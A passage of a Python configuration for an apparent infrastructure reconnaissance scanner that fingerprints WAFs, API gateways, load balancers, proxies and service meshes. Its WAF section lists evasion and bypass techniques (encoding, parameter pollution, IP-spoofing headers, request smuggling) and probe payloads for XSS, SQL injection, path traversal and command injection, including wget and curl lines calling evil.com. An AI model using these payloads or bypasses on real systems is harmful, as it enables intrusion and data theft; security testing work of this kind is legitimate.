                            'baseline_samples': 5,
                            'anomaly_threshold': 2.0,  # Standard deviations
                            'waf_processing_indicators': {
                                'min_delay_ms': 50,
                                'max_delay_ms': 5000,
                                'pattern_analysis': True
                            }
                        }
                    },
                    
                    'evasion_techniques': {
                        'case_variation': [
                            'SCRIPT', 'Script', 'ScRiPt', 'sCrIpT'
                        ],
                        'encoding_variations': [
                            'url_encode', 'double_url_encode', 'hex_encode', 
                            'unicode_encode', 'html_encode'
                        ],
                        'payload_fragmentation': {
                            'enabled': True,
                            'fragment_sizes': [1, 2, 4, 8, 16],
                            'delay_between_fragments': 0.1
                        },
                        'parameter_pollution': {
                            'enabled': True,
                            'pollution_patterns': [
                                'param=value1&param=value2',
                                'param[]=value1&param[]=value2',
                                'param.x=value1&param.y=value2'
                            ]
                        }
                    },
                    
                    'bypass_attempts': {
                        'ip_spoofing_headers': [
                            'X-Forwarded-For', 'X-Real-IP', 'X-Client-IP',
                            'X-Originating-IP', 'X-Remote-IP', 'Client-IP',
                            'True-Client-IP', 'X-Cluster-Client-IP'
                        ],
                        'protocol_manipulation': {
                            'http_version_downgrade': ['HTTP/1.0', 'HTTP/0.9'],
                            'method_override': [
                                'X-HTTP-Method-Override: PUT',
                                'X-HTTP-Method-Override: DELETE',
                                'X-Method-Override: PATCH'
                            ],
                            'content_type_confusion': [
                                'application/json', 'text/plain', 'multipart/form-data',
                                'application/x-www-form-urlencoded', 'text/xml'
                            ]
                        },
                        'request_smuggling_tests': {
                            'cl_te_smuggling': True,
                            'te_cl_smuggling': True,
                            'te_te_smuggling': True
                        }
                    },
                    
                    'fingerprinting_payloads': {
                        'error_based_fingerprinting': [
                            # Payloads designed to trigger specific WAF error messages
                            f"/?error=<script>alert('WAF-{markers['uuid']}')</script>",
                            f"/?error=' OR 1=1--{markers['uuid']}",
                            f"/?error=../../../etc/passwd#{markers['uuid']}",
                            f"/?error=<?xml version='1.0'?><root>{markers['uuid']}</root>",
                            f"/?error={{7*7}}{markers['uuid']}",
                            f"/?error=cmd.exe|echo {markers['uuid']}",
                            f"/?error=cat /proc/version#{markers['uuid']}",
                            f"/?error=wget http://evil.com/{markers['uuid']}",
                            f"/?error=curl -d 'data={markers['uuid']}' http://evil.com/",
                            f"/?error=python -c 'print(\"{markers['uuid']}\")'",
                            f"/?error=perl -e 'print \"{markers['uuid']}\"'",
                            f"/?error=ruby -e 'puts \"{markers['uuid']}\";'",
                            f"/?error=php -r 'echo \"{markers['uuid']}\";'",
                            f"/?error=node -e 'console.log(\"{markers['uuid']}\")'",
                            f"/?error=powershell -c 'echo {markers['uuid']}'",
                            f"/?error=/bin/sh -c 'echo {markers['uuid']}'",
                            f"/?error=cmd /c echo {markers['uuid']}"
                        ],
                        
                        'protocol_specific_tests': {
                            'http2_specific': [
                                # HTTP/2 specific payloads that might bypass HTTP/1.1 WAFs
                                f"/:method=POST /:path=/admin /:scheme=https host:evil.com#{markers['uuid']}",
                                f"/:method=CONNECT /:authority=evil.com:443#{markers['uuid']}"
                            ],
                            'websocket_upgrade': [
                                f"GET / HTTP/1.1\\r\\nUpgrade: websocket\\r\\nConnection: Upgrade\\r\\nSec-WebSocket-Key: {markers['uuid']}\\r\\n"
                            ]
                        }
                    },
                    
                    'waf_behavior_analysis': {
                        'rate_limiting_detection': {
                            'enabled': True,
                            'request_burst_size': 50,
                            'burst_interval': 1.0,  # seconds
                            'rate_limit_indicators': [
                                'too many requests', 'rate limit exceeded', 
                                'quota exceeded', 'throttled'
                            ]
                        },
                        
                        'geo_blocking_detection': {
                            'enabled': True,
                            'country_headers': [
                                'CF-IPCountry', 'X-Country-Code', 'X-GeoIP-Country',
                                'CloudFront-Viewer-Country', 'X-Akamai-Edgescape'
                            ],
                            'blocked_indicators': [
                                'geo blocked', 'country not allowed', 
                                'region blocked', 'geographic restriction'
                            ]
                        },
                        
                        'bot_detection_analysis': {
                            'enabled': True,
                            'bot_challenge_indicators': [
                                'javascript challenge', 'captcha', 'bot detection',
                                'human verification', 'proof of work', 'challenge page'
                            ],
                            'bot_headers': [
                                'CF-Bot-Management-Verified', 'X-Bot-Score', 
                                'X-Human-Challenge', 'X-Captcha-Required'
                            ]
                        }
                    },
                    
                    'machine_learning_detection': {
                        'enabled': False,  # Requires ML model training
                        'behavioral_analysis': {
                            'request_patterns': True,
                            'timing_patterns': True,
                            'payload_similarity': True,
                            'response_clustering': True
                        },
                        'anomaly_detection': {
                            'statistical_analysis': True,
                            'outlier_detection': True,
                            'pattern_recognition': True
                        }
                    },
                    
                    'custom_rule_detection': {
                        'enabled': True,
                        'rule_categories': [
                            'custom_xss_rules', 'custom_sqli_rules', 
                            'custom_rce_rules', 'custom_lfi_rules'
                        ],
                        'signature_extraction': {
                            'error_message_analysis': True,
                            'response_header_analysis': True,
                            'timing_pattern_analysis': True
                        }
                    }
                },
                
                # WAF-specific bypass techniques
                'bypass_techniques': {
                    'cloudflare_bypasses': [
                        'origin_ip_discovery', 'subdomain_enumeration',
                        'dns_history_analysis', 'certificate_transparency'
                    ],
                    'aws_waf_bypasses': [
                        'regional_endpoint_discovery', 'api_gateway_enumeration',
                        'lambda_direct_invocation'
                    ],
                    'generic_bypasses': [
                        'case_variation', 'encoding_obfuscation', 
                        'parameter_pollution', 'header_manipulation',
                        'protocol_confusion', 'request_smuggling',
                        'chunked_encoding', 'multipart_bypass'
                    ]
                },
                
                # False positive detection
                'false_positive_analysis': {
                    'enabled': True,
                    'confidence_scoring': {
                        'high_confidence_indicators': [
                            'specific_waf_headers', 'known_error_pages',
                            'consistent_blocking_behavior', 'timing_signatures'
                        ],
                        'medium_confidence_indicators': [
                            'generic_error_messages', 'suspicious_status_codes',
                            'response_time_anomalies'
                        ],
                        'low_confidence_indicators': [
                            'generic_403_responses', 'inconsistent_behavior',
                            'no_clear_signatures'
                        ]
                    },
                    'verification_tests': {
                        'legitimate_request_test': True,
                        'baseline_comparison': True,
                        'multiple_payload_confirmation': True,
                        'timing_consistency_check': True
                    }
                }
            },

            # Layer 4: API Gateway Detection (Versione Espansa)
            'api_gateway_detection': {
                'priority': 4,
                'headers': {
                    'X-API-Gateway-Test': markers['uuid'],
                    'Authorization': f'Bearer test-{markers["sequence"]}',
                    'X-API-Key': f'test-key-{markers["uuid"]}',
                    'X-Client-ID': markers['uuid'],
                    'X-Forwarded-For': '127.0.0.1',
                    'X-Real-IP': '127.0.0.1',
                    'X-Request-ID': markers['uuid'],
                    'X-Correlation-ID': markers['uuid'],
                    'User-Agent': f'StackRecon/1.0 ({markers["uuid"]})',
                    'Accept': 'application/json, application/xml, text/plain',
                    'Content-Type': 'application/json'
                },
                'api_tests': {
                    'rate_limiting': {
                        'requests_per_second': [1, 5, 10, 25, 50, 75, 100, 150, 200],
                        'burst_patterns': [5, 10, 20, 30, 50, 75, 100, 150, 200],
                        'concurrent_requests': [1, 5, 10, 20, 50],
                        'rate_limit_window': ['1s', '1m', '1h', '24h']
                    },
                    'auth_mechanisms': [
                        'bearer_token', 'api_key', 'oauth2', 'jwt', 'basic_auth',
                        'hmac_signature', 'mutual_tls', 'digest_auth', 'hawk_auth',
                        'oauth1', 'saml', 'openid_connect', 'custom_header'
                    ],
                    'routing_tests': [
                        f'/api/v1/test-{markers["uuid"]}',
                        f'/api/v2/test-{markers["uuid"]}',
                        f'/api/v3/test-{markers["uuid"]}',
                        f'/v1/test-{markers["uuid"]}',
                        f'/v2/test-{markers["uuid"]}',
                        f'/graphql?query={{test(id:"{markers["uuid"]}")}}',
                        f'/rest/test/{markers["uuid"]}',
                        f'/gateway/test/{markers["uuid"]}',
                        f'/proxy/test/{markers["uuid"]}',
                        f'/api/test/{markers["uuid"]}',
                        f'/service/test/{markers["uuid"]}',
                        f'/microservice/test/{markers["uuid"]}',
                        f'/backend/test/{markers["uuid"]}',
                        f'/upstream/test/{markers["uuid"]}',
                        f'/{markers["uuid"]}/test',
                        f'/health/test-{markers["uuid"]}',
                        f'/status/test-{markers["uuid"]}',
                        f'/ping/test-{markers["uuid"]}'
                    ],
                    'http_methods': ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS'],
                    'payload_sizes': [0, 100, 1024, 10240, 102400, 1048576],  # bytes
                    'timeout_tests': [1, 5, 10, 30, 60, 120]  # seconds
                },
                'gateway_signatures': {
                    # Open Source
                    'kong': ['x-kong', 'kong-', 'server: kong', 'x-kong-upstream-latency'],
                    'zuul': ['x-zuul', 'zuul-', 'x-netflix-zuul'],
                    'ambassador': ['x-ambassador', 'ambassador-', 'x-envoy-upstream-service-time'],
                    'istio': ['x-envoy', 'istio-', 'x-envoy-upstream-service-time', 'x-b3-'],
                    'traefik': ['x-traefik', 'traefik-', 'server: traefik'],
                    'nginx': ['server: nginx', 'x-nginx-', 'x-upstream-'],
                    'apache': ['server: apache', 'x-apache-'],
                    'haproxy': ['server: haproxy', 'x-haproxy-'],
                    'linkerd': ['x-linkerd', 'l5d-'],
                    'consul_connect': ['x-consul-', 'connect-'],
                    'envoy': ['x-envoy-', 'server: envoy'],
                    
                    # Cloud Providers
                    'aws_api_gateway': ['x-amzn-requestid', 'x-amz-apigw', 'x-amzn-trace-id', 'x-amz-'],
                    'aws_alb': ['x-amzn-trace-id', 'x-amzn-requestid'],
                    'aws_cloudfront': ['x-amz-cf-id', 'x-cache', 'cloudfront'],
                    'azure_apim': ['x-ms-request-id', 'apim-', 'x-ms-', 'ocp-apim-'],
                    'azure_front_door': ['x-azure-ref', 'x-fd-'],
                    'google_cloud': ['x-goog-', 'x-cloud-', 'x-gfe-'],
                    'google_cloud_load_balancer': ['x-cloud-trace-context', 'x-goog-'],
                    'cloudflare': ['cf-ray', 'server: cloudflare', 'cf-'],
                    'fastly': ['x-served-by', 'x-cache', 'fastly'],
                    'akamai': ['x-akamai-', 'akamai-'],
                    
                    # Enterprise
                    'mulesoft': ['x-mule-', 'mule-'],
                    'apigee': ['x-apigee-', 'apigee-'],
                    'wso2': ['x-wso2-', 'wso2-'],
                    'tibco': ['x-tibco-', 'tibco-'],
                    'ca_api_gateway': ['x-ca-', 'layer7-'],
                    'axway': ['x-axway-', 'axway-'],
                    'oracle_api_platform': ['x-oracle-', 'oracle-'],
                    'ibm_api_connect': ['x-ibm-', 'x-dp-'],
                    'redhat_3scale': ['x-3scale-', '3scale-'],
                    
                    # API Management Platforms
                    'postman': ['x-postman-', 'postman-'],
                    'insomnia': ['x-insomnia-', 'insomnia-'],
                    'swagger_hub': ['x-swagger-', 'swaggerhub-'],
                    'rapid_api': ['x-rapidapi-', 'rapidapi-'],
                    
                    # Service Mesh
                    'kuma': ['x-kuma-', 'kuma-'],
                    'open_service_mesh': ['x-osm-', 'osm-'],
                    'maesh': ['x-maesh-', 'maesh-'],
                    
                    # CDN/Edge
                    'amazon_cloudfront': ['x-amz-cf-id', 'cloudfront-'],
                    'keycdn': ['x-cache', 'keycdn'],
                    'bunnycdn': ['x-cache', 'bunnycdn'],
                    'maxcdn': ['x-cache', 'maxcdn']
                },
                'response_analysis': {
                    'json_structure': True,
                    'xml_structure': True,
                    'error_formats': True,
                    'cors_headers': True,
                    'security_headers': True,
                    'caching_headers': True,
                    'compression_detection': True,
                    'response_time_analysis': True,
                    'content_encoding': ['gzip', 'deflate', 'br', 'identity'],
                    'status_code_patterns': [200, 201, 400, 401, 403, 404, 429, 500, 502, 503, 504]
                },
                'advanced_detection': {
                    'websocket_support': {
                        'upgrade_headers': ['websocket', 'h2c'],
                        'protocols': ['ws', 'wss']
                    },
                    'http2_support': True,
                    'grpc_support': {
                        'content_types': ['application/grpc', 'application/grpc+proto'],
                        'headers': ['grpc-', 'te: trailers']
                    },
                    'circuit_breaker_patterns': [
                        'x-circuit-breaker', 'x-fallback', 'x-timeout'
                    ],
                    'load_balancing_headers': [
                        'x-upstream-addr', 'x-backend-server', 'x-served-by'
                    ],
                    'monitoring_headers': [
                        'x-trace-id', 'x-span-id', 'x-request-id', 'x-correlation-id'
                    ],
                    'geographic_routing': [
                        'x-geo-country', 'x-geo-region', 'x-datacenter'
                    ]
                },
                'security_tests': {
                    'ssl_termination': True,
                    'hsts_headers': True,
                    'csp_headers': True,
                    'xss_protection': True,
                    'clickjacking_protection': True,
                    'content_sniffing_protection': True,
                    'referrer_policy': True,
                    'feature_policy': True
                },
                'performance_analysis': {
                    'response_time_thresholds': [50, 100, 200, 500, 1000, 2000],  # ms
                    'connection_reuse': True,
                    'keep_alive': True,
                    'compression_ratio': True,
                    'cache_hit_analysis': True
                },
                'api_versioning_detection': {
                    'header_versioning': ['X-API-Version', 'API-Version', 'Version'],
                    'url_versioning': ['/v1/', '/v2/', '/v3/', '/api/v1/', '/api/v2/'],
                    'query_versioning': ['?version=', '?v=', '?api-version='],
                    'accept_header_versioning': ['application/vnd.api+json;version=']
                },
                'documentation_endpoints': [
                    '/docs', '/swagger', '/openapi', '/api-docs', '/redoc',
                    '/swagger-ui', '/api/docs', '/documentation', '/spec'
                ]
            },

            # Layer 5: Load Balancer Detection (Versione Espansa)
            'load_balancer_detection': {
                'priority': 5,
                'headers': {
                    'X-LB-Test': markers['uuid'],
                    'X-Forwarded-For': '127.0.0.1, 192.168.1.1',
                    'X-Real-IP': '127.0.0.1',
                    'X-Client-IP': '127.0.0.1',
                    'X-Cluster-Client-IP': '127.0.0.1',
                    'X-Original-Forwarded-For': '127.0.0.1',
                    'X-Request-ID': markers['uuid'],
                    'X-Correlation-ID': markers['uuid'],
                    'User-Agent': f'LBTest/1.0 ({markers["uuid"]})',
                    'Connection': 'keep-alive',
                    'Accept-Encoding': 'gzip, deflate, br'
                },
                'lb_tests': {
                    'algorithms': [
                        'round_robin', 'least_connections', 'weighted_round_robin',
                        'ip_hash', 'consistent_hashing', 'least_response_time',
                        'resource_based', 'geographic', 'random'
                    ],
                    'session_persistence': {
                        'cookie_based': True,
                        'ip_based': True,
                        'header_based': True,
                        'url_parameter_based': True
                    },
                    'health_checks': {
                        'tcp_check': True,
                        'http_check': True,
                        'https_check': True,
                        'custom_check': True
                    },
                    'failover_tests': {
                        'active_passive': True,
                        'active_active': True,
                        'multi_region': True
                    }
                },
                'lb_signatures': {
                    # Cloud Load Balancers
                    'aws_alb': ['x-amzn-trace-id', 'x-amzn-requestid', 'x-amz-cf-id'],
                    'aws_nlb': ['x-amzn-trace-id', 'x-forwarded-proto'],
                    'aws_elb_classic': ['x-amzn-requestid', 'x-forwarded-port'],
                    'aws_cloudfront': ['x-amz-cf-id', 'x-amz-cf-pop', 'via: cloudfront'],
                    'azure_load_balancer': ['x-ms-request-id', 'x-azure-ref'],
                    'azure_application_gateway': ['x-ms-request-id', 'x-appgw-trace'],
                    'azure_front_door': ['x-azure-ref', 'x-fd-healthprobe'],
                    'google_cloud_lb': ['x-cloud-trace-context', 'x-goog-'],
                    'google_http_lb': ['x-goog-trace', 'x-gfe-'],
                    'cloudflare': ['cf-ray', 'server: cloudflare', 'cf-cache-status'],
                    'fastly': ['x-served-by', 'x-cache', 'x-timer', 'fastly-debug-digest'],
                    'akamai': ['x-akamai-transformed', 'x-cache-key', 'x-check-cacheable'],
                    'keycdn': ['x-cache', 'x-edge-location', 'server: keycdn'],
                    
                    # Hardware/Appliance Load Balancers
                    'f5_big_ip': ['x-wa-info', 'x-cnection', 'server: big-ip'],
                    'citrix_netscaler': ['x-client-ip', 'ns_af', 'citrix-'],
                    'a10_networks': ['x-a10-', 'a10-'],
                    'barracuda': ['x-barracuda-', 'barracuda-'],
                    'kemp': ['x-kemp-', 'kemp-'],
                    'radware': ['x-radware-', 'radware-'],
                    'array_networks': ['x-array-', 'array-'],
                    
                    # Software Load Balancers
                    'nginx': ['server: nginx', 'x-nginx-', 'x-upstream-'],
                    'nginx_plus': ['server: nginx', 'x-nginx-plus'],
                    'apache_httpd': ['server: apache', 'x-apache-'],
                    'haproxy': ['server: haproxy', 'x-haproxy-'],
                    'traefik': ['server: traefik', 'x-traefik-'],
                    'envoy': ['server: envoy', 'x-envoy-'],
                    'istio_proxy': ['x-envoy-', 'istio-'],
                    'linkerd': ['x-linkerd-', 'l5d-'],
                    'consul_connect': ['x-consul-', 'connect-proxy'],
                    'ambassador': ['x-ambassador-', 'x-envoy-upstream-service-time'],
                    
                    # # Enterprise/Commercial
                    'vmware_nsx': ['x-nsx-', 'nsx-'],
                    'juniper_contrail': ['x-contrail-', 'contrail-'],
                    'cisco_ace': ['x-ace-', 'cisco-ace'],
                    'riverbed': ['x-riverbed-', 'riverbed-'],
                    'silver_peak': ['x-silver-peak-', 'silver-peak-'],
                    
                    # Service Discovery Integration
                    'consul': ['x-consul-', 'consul-'],
                    'etcd': ['x-etcd-', 'etcd-'],
                    'eureka': ['x-eureka-', 'eureka-'],
                    'zookeeper': ['x-zookeeper-', 'zk-']
                    },

                'backend_detection': {
                    'server_identification': True,
                    'upstream_response_time': True,
                    'backend_server_headers': [
                        'x-upstream-addr', 'x-backend-server', 'x-served-by',
                        'x-upstream-response-time', 'x-upstream-status'
                    ],
                    'connection_info': [
                        'x-forwarded-proto', 'x-forwarded-port', 'x-forwarded-host'
                    ]
                },
                'performance_analysis': {
                    'response_time_distribution': True,
                    'connection_pooling': True,
                    'keep_alive_support': True,
                    'compression_support': ['gzip', 'deflate', 'br'],
                    'http2_support': True,
                    'ssl_termination': True
                },
                'geographic_distribution': {
                    'edge_locations': True,
                    'pop_detection': True,
                    'geographic_headers': [
                        'x-geo-country', 'x-geo-region', 'x-datacenter',
                        'x-edge-location', 'x-pop'
                    ]
                }
            },

            # Layer 5.5: Proxy Detection (Versione Espansa)
            'proxy_detection': {
                'priority': 5.5,
                'headers': {
                    'X-Proxy-Test': markers['uuid'],
                    'X-Forwarded-For': '127.0.0.1, 10.0.0.1',
                    'X-Real-IP': '127.0.0.1',
                    'X-Client-IP': '127.0.0.1',
                    'X-Remote-Addr': '127.0.0.1',
                    'X-Originating-IP': '127.0.0.1',
                    'X-Request-ID': markers['uuid'],
                    'Via': f'1.1 proxy-test-{markers["sequence"]}',
                    'Proxy-Connection': 'keep-alive',
                    'User-Agent': f'ProxyTest/1.0 ({markers["uuid"]})',
                    'Accept': '*/*',
                    'Cache-Control': 'no-cache'
                },
                'proxy_types': {
                    'forward_proxy': {
                        'transparent': True,
                        'explicit': True,
                        'intercepting': True
                    },
                    'reverse_proxy': {
                        'caching': True,
                        'ssl_termination': True,
                        'compression': True,
                        'load_balancing': True
                    },
                    'specialized_proxies': {
                        'web_acceleration': True,
                        'security_proxy': True,
                        'content_filtering': True,
                        'bandwidth_management': True
                    }
                },
                'proxy_signatures': {
                    # Open Source Proxies
                    'squid': ['server: squid', 'via: squid', 'x-squid-'],
                    'nginx': ['server: nginx', 'x-nginx-', 'x-accel-'],
                    'apache_httpd': ['server: apache', 'x-apache-', 'x-forwarded-by'],
                    'varnish': ['server: varnish', 'x-varnish', 'via: varnish'],
                    'haproxy': ['server: haproxy', 'x-haproxy-'],
                    'traefik': ['server: traefik', 'x-traefik-'],
                    'envoy': ['server: envoy', 'x-envoy-'],
                    'caddy': ['server: caddy', 'x-caddy-'],
                    
                    # Enterprise/Commercial Proxies
                    'f5_big_ip': ['server: big-ip', 'x-wa-info'],
                    'citrix_netscaler': ['citrix-', 'ns_af'],
                    'bluecoat': ['bluecoat-', 'x-bluecoat-'],
                    'websense': ['websense-', 'x-websense-'],
                    'mcafee_web_gateway': ['mcafee-', 'x-mcafee-'],
                    'symantec_web_security': ['symantec-', 'x-symantec-'],
                    'checkpoint_firewall': ['checkpoint-', 'x-checkpoint-'],
                    'fortinet_fortigate': ['fortinet-', 'x-fortinet-'],
                    'palo_alto': ['paloalto-', 'x-pan-'],
                    'juniper_ssl_vpn': ['juniper-', 'x-juniper-'],
                    
                    # Cloud Proxies/CDN
                    'cloudflare': ['cf-ray', 'server: cloudflare'],
                    'fastly': ['x-served-by', 'via: fastly'],
                    'akamai': ['x-akamai-', 'akamai-ghost'],
                    'keycdn': ['x-cache', 'server: keycdn'],
                    'maxcdn': ['x-cache', 'maxcdn'],
                    'bunnycdn': ['bunnycdn', 'x-cache'],
                    'aws_cloudfront': ['x-amz-cf-id', 'via: cloudfront'],
                    'google_cloud_cdn': ['x-goog-', 'via: http/1.1 google'],
                    'azure_front_door': ['x-azure-ref', 'x-fd-'],
                    
                    # API Gateways as Reverse Proxies
                    'kong': ['server: kong', 'x-kong-'],
                    'zuul': ['x-zuul-', 'x-netflix-'],
                    'ambassador': ['x-ambassador-', 'x-envoy-'],
                    'istio': ['x-envoy-', 'istio-'],
                    
                    # Security Proxies
                    'imperva': ['imperva-', 'x-iij-'],
                    'akamai_kona': ['akamai-', 'x-akamai-config-log-detail'],
                    'cloudflare_waf': ['cf-ray', 'cf-cache-status'],
                    'aws_waf': ['x-amzn-waf-', 'x-amzn-requestid'],
                    'azure_waf': ['x-ms-request-id', 'x-azure-'],
                    
                    # Content Delivery/Acceleration
                    'incapsula': ['incap_ses', 'x-iij-'],
                    'sucuri': ['x-sucuri-', 'sucuri-'],
                    'section_io': ['section-', 'x-section-'],
                    'keycdn': ['x-cache', 'x-edge-location'],
                    
                    # Monitoring/Analytics Proxies
                    'new_relic': ['x-newrelic-', 'newrelic-'],
                    'datadog': ['x-datadog-', 'datadog-'],
                    'pingdom': ['pingdom-', 'x-pingdom-'],
                    
                    # Development/Testing Proxies
                    'charles_proxy': ['charles-', 'x-charles-'],
                    'fiddler': ['fiddler-', 'x-fiddler-'],
                    'burp_suite': ['burp-', 'x-burp-'],
                    'owasp_zap': ['zap-', 'x-zap-']
                },
                'proxy_behavior_analysis': {
                    'header_modification': {
                        'via_headers': True,
                        'x_forwarded_headers': True,
                        'custom_headers': True,
                        'header_removal': True
                    },
                    'caching_behavior': {
                        'cache_headers': ['x-cache', 'x-cache-status', 'age'],
                        'cache_control': True,
                        'etag_handling': True,
                        'last_modified': True
                    },
                    'ssl_handling': {
                        'ssl_termination': True,
                        'ssl_passthrough': True,
                        'certificate_details': True,
                        'tls_version': True
                    },
                    'compression': {
                        'gzip': True,
                        'deflate': True,
                        'brotli': True,
                        'compression_ratio': True
                    }
                },
                'security_analysis': {
                    'waf_detection': True,
                    'ddos_protection': True,
                    'rate_limiting': True,
                    'ip_filtering': True,
                    'geo_blocking': True,
                    'bot_protection': True,
                    'csrf_protection': True,
                    'xss_protection': True
                },
                'performance_metrics': {
                    'response_time_analysis': True,
                    'throughput_testing': True,
                    'connection_reuse': True,
                    'bandwidth_optimization': True,
                    'latency_reduction': True
                },
                'protocol_support': {
                    'http_versions': ['1.0', '1.1', '2.0', '3.0'],
                    'websocket': True,
                    'grpc': True,
                    'tcp_proxy': True,
                    'udp_proxy': True,
                    'socks_proxy': ['4', '5']
                },
                'anonymity_detection': {
                    'transparent_proxy': True,
                    'anonymous_proxy': True,
                    'elite_proxy': True,
                    'distorting_proxy': True
                }
            },
            
            # Layer 6: Service Mesh Detection (Versione Espansa)
            'service_mesh_detection': {
                'priority': 6,
                'headers': {
                    'X-Service-Mesh-Test': markers['uuid'],
                    'X-Trace-Test': markers['sequence'],
                    'X-B3-TraceId': markers['uuid'],
                    'X-B3-SpanId': markers['sequence'],
                    'X-B3-ParentSpanId': f'parent-{markers["sequence"]}',
                    'X-B3-Sampled': '1',
                    'X-B3-Flags': '1',
                    'X-Request-ID': markers['uuid'],
                    'X-Correlation-ID': markers['uuid'],
                    'X-Forwarded-For': '127.0.0.1',
                    'X-Real-IP': '127.0.0.1',
                    'User-Agent': f'ServiceMeshTest/1.0 ({markers["uuid"]})',
                    'Authorization': f'Bearer mesh-test-{markers["sequence"]}',
                    'X-Mesh-Test-Header': markers['uuid'],
                    'Baggage': f'test-key=test-value-{markers["sequence"]}',
                    'Uber-Trace-Id': f'{markers["uuid"]}:{markers["sequence"]}:0:1'
                },
                'mesh_tests': {
                    'sidecar_detection': {
                        'admin_endpoints': [
                            f'/stats?test={markers["uuid"]}',
                            f'/config_dump?test={markers["uuid"]}',
                            f'/clusters?test={markers["uuid"]}',
                            f'/server_info?test={markers["uuid"]}',
                            f'/listeners?test={markers["uuid"]}',
                            f'/runtime?test={markers["uuid"]}',
                            f'/certs?test={markers["uuid"]}',
                            f'/memory?test={markers["uuid"]}',
                            f'/cpuprofiler?test={markers["uuid"]}',
                            f'/contention?test={markers["uuid"]}',
                            f'/ready?test={markers["uuid"]}',
                            f'/stats/prometheus?test={markers["uuid"]}',
                            f'/hot_restart_version?test={markers["uuid"]}'
                        ],
                        'envoy_specific': {
                            'admin_port': [15000, 9901, 8001, 8080],
                            'admin_paths': ['/admin', '/envoy-admin', '/stats', '/config_dump'],
                            'version_detection': True,
                            'build_info': True
                        },
                        'istio_specific': {
                            'pilot_endpoints': [':15010', ':15011', ':15012'],
                            'istiod_detection': True,
                            'galley_detection': True,
                            'citadel_detection': True,
                            'mixer_detection': True  # legacy
                        },
                        'linkerd_specific': {
                            'admin_port': [4191, 4190],
                            'control_plane_ns': 'linkerd',
                            'proxy_version': True
                        },
                        'consul_specific': {
                            'connect_ca_roots': '/v1/connect/ca/roots',
                            'connect_intentions': '/v1/connect/intentions',
                            'agent_self': '/v1/agent/self'
                        }
                    },
                    'mtls_detection': {
                        'cert_headers': [
                            'x-forwarded-client-cert', 'x-ssl-client-cert',
                            'x-client-cert', 'ssl-client-cert'
                        ],
                        'tls_version_tests': ['1.2', '1.3'],
                        'cipher_suite_detection': True,
                        'cert_chain_validation': True,
                        'spiffe_detection': True,
                        'cert_rotation_detection': True
                    },
                    'traffic_policies': {
                        'circuit_breaker_tests': {
                            'max_connections': [100, 1000, 10000],
                            'max_pending_requests': [100, 1000],
                            'max_requests': [100, 1000, 10000],
                            'max_retries': [3, 5, 10]
                        },
                        'retry_policy_tests': {
                            'retry_attempts': [3, 5, 10],
                            'per_try_timeout': ['1s', '5s', '10s', '30s'],
                            'retry_on': ['5xx', 'gateway-error', 'connect-failure', 'refused-stream']
                        },
                        'timeout_tests': [1, 5, 10, 15, 30, 60, 120],
                        'rate_limiting_tests': {
                            'requests_per_second': [10, 100, 1000],
                            'burst_size': [10, 50, 100]
                        },
                        'fault_injection': {
                            'delay_injection': [100, 500, 1000, 5000],  # ms
                            'abort_injection': [400, 500, 503, 504]  # HTTP codes
                        }
                    },
                    'observability': {
                        'tracing_systems': {
                            'jaeger': True,
                            'zipkin': True,
                            'opencensus': True,
                            'opentelemetry': True,
                            'aws_xray': True,
                            'datadog': True,
                            'lightstep': True
                        },
                        'metrics_collection': {
                            'prometheus': True,
                            'statsd': True,
                            'graphite': True,
                            'influxdb': True
                        },
                        'logging_systems': {
                            'fluentd': True,
                            'fluent_bit': True,
                            'logstash': True,
                            'vector': True
                        }
                    }
                },
                'mesh_signatures': {
                    # Major Service Meshes
                    'istio_envoy': {
                        'headers': ['x-envoy-', 'istio-', 'x-b3-'],
                        'server_headers': ['istio-proxy', 'envoy'],
                        'version_patterns': ['istio/', 'envoy/'],
                        'pilot_discovery': True,
                        'mixer_telemetry': True,
                        'citadel_security': True
                    },
                    'linkerd': {
                        'headers': ['l5d-', 'linkerd-'],
                        'server_headers': ['linkerd-proxy'],
                        'version_patterns': ['linkerd/'],
                        'control_plane': True,
                        'destination_service': True,
                        'identity_service': True
                    },
                    'consul_connect': {
                        'headers': ['x-consul-', 'connect-'],
                        'server_headers': ['consul-connect'],
                        'service_discovery': True,
                        'intentions_api': True,
                        'ca_provider': True
                    },
                    'traefik_mesh': {
                        'headers': ['x-traefik-', 'traefik-mesh-'],
                        'server_headers': ['traefik-mesh'],
                        'control_plane': True,
                        'proxy_mode': 'smi'
                    },
                    'kuma': {
                        'headers': ['x-kuma-', 'kuma-'],
                        'server_headers': ['kuma-dp'],
                        'control_plane': 'kuma-cp',
                        'data_plane': 'kuma-dp',
                        'universal_mode': True,
                        'kubernetes_mode': True
                    },
                    'open_service_mesh': {
                        'headers': ['x-osm-', 'osm-'],
                        'server_headers': ['osm-proxy'],
                        'controller': 'osm-controller',
                        'injector': 'osm-injector',
                        'bootstrap': 'osm-bootstrap'
                    },
                    'cilium': {
                        'headers': ['x-cilium-', 'cilium-'],
                        'server_headers': ['cilium-envoy'],
                        'hubble_relay': True,
                        'operator': True,
                        'cni': True
                    },
                    'app_mesh': {
                        'headers': ['x-amzn-', 'x-aws-'],
                        'server_headers': ['aws-app-mesh-proxy'],
                        'envoy_based': True,
                        'virtual_gateway': True,
                        'virtual_router': True
                    },
                    'gloo_mesh': {
                        'headers': ['x-gloo-', 'gloo-'],
                        'server_headers': ['gloo-proxy'],
                        'management_plane': True,
                        'discovery': True,
                        'networking': True
                    },
                    'maesh': {
                        'headers': ['x-maesh-', 'maesh-'],
                        'server_headers': ['maesh-proxy'],
                        'controller': 'maesh-controller',
                        'prepare': 'maesh-prepare'
                    },
                    'flagger': {
                        'headers': ['x-flagger-', 'flagger-'],
                        'canary_deployment': True,
                        'progressive_delivery': True,
                        'metrics_analysis': True
                    },
                    'anthos_service_mesh': {
                        'headers': ['x-goog-', 'asm-'],
                        'server_headers': ['asm-proxy'],
                        'managed_control_plane': True,
                        'gcp_integration': True
                    },
                    'service_mesh_interface': {
                        'headers': ['x-smi-', 'smi-'],
                        'traffic_access': True,
                        'traffic_metrics': True,
                        'traffic_split': True,
                        'traffic_specs': True
                    }
                },
                'proxy_detection': {
                    # Sidecar Proxies
                    'envoy_proxy': {
                        'admin_interface': True,
                        'stats_endpoint': True,
                        'config_dump': True,
                        'version_info': True,
                        'cluster_manager': True
                    },
                    'linkerd_proxy': {
                        'rust_based': True,
                        'ultra_light': True,
                        'micro_proxy': True,
                        'tap_interface': True
                    },
                    'nginx_service_mesh': {
                        'nginx_plus_based': True,
                        'spiffe_integration': True,
                        'opentracing': True
                    },
                    'haproxy_ingress': {
